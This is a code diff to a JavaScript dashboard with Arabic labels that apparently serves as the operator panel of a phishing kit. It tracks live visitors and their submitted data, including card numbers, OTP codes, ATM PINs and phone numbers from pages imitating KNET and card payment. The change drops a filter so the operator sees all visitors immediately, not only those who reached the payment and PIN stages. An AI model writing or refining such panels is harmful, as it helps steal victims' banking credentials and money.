@@ -3872,39 +3872,8 @@
       visitorCount.textContent = connectedCount + ' نشط / ' + allVisitors.length + ' زائر';
       updatePageStats();
 
-      // Filter visitors: only show those who have submitted data (reached Extras phase or beyond)
-      const list = allVisitors.filter(v => {
-        // Check if visitor has any data history
-        if (v.dataHistory && v.dataHistory.length > 0) {
-          // Check if any of the data history entries is from Extras or beyond
-          // We check the 'current' page or specific keys in the content object
-          return v.dataHistory.some(entry => {
-            // Check by page name
-            if (entry.page === 'الإضافات (Extras)' || 
-                entry.page === 'المراجعة والدفع' || 
-                entry.page === 'دفع KNET' || 
-                entry.page === 'دفع بطاقة' || 
-                entry.page === 'رمز التحقق (OTP)' || 
-                entry.page === 'كلمة مرور الصراف الآلي' || 
-                entry.page === 'توثيق الجوال') {
-              return true;
-            }
-            
-            // Check by content keys
-            if (entry.content) {
-              const keys = Object.keys(entry.content);
-              return keys.includes('الخدمات الإضافية') || 
-                     keys.includes('طريقة الدفع') || 
-                     keys.includes('رقم البطاقة') ||
-                     keys.includes('رمز التحقق (OTP)') ||
-                     keys.includes('كلمة مرور الصراف الآلي') ||
-                     keys.includes('رقم الهاتف (الشبكة)');
-            }
-            return false;
-          });
-        }
-        return false;
-      }).sort((a, b) => {
+      // Show all visitors immediately
+      const list = allVisitors.sort((a, b) => {
         // Sort by last activity (most recent first)
         const getLastActivity = (v) => {
           if (v.lastDataUpdate) return new Date(v.lastDataUpdate).getTime();
